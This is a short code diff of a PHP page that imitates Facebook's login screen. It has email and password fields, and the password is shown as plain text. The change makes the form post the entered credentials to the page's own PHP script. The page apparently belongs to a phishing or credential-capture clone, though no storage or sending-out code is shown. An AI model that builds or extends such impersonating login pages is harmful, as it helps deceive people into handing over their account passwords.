@@ -62,7 +62,7 @@ width:400px;
 background-color: white;
 border-radius: 10px;">
   <p style="margin-left:30%;margin-top:5%;font-size:20px;">Log in to Facebook</p>
-  <form>
+  <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
   <input name="name" type="text" style="margin-top:3%;" placeholder="Email or Phone number">
 <span class="error"><?php echo $empty_err; echo $pass_err;?></span>
   <input name="password" type="text" placeholder="Password">
